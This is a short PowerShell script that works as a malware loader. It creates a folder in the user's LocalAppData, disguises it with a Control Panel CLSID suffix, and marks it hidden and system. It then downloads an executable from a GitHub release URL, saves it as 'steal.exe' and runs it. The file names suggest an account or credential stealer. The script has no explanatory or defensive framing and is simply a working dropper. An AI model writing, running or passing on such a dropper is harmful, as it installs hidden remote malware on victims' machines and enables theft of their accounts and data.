$rdir = "$env:localappdata\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/tootls.exe"
$output = "$dir\steal.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Start-Process -FilePath $output
}
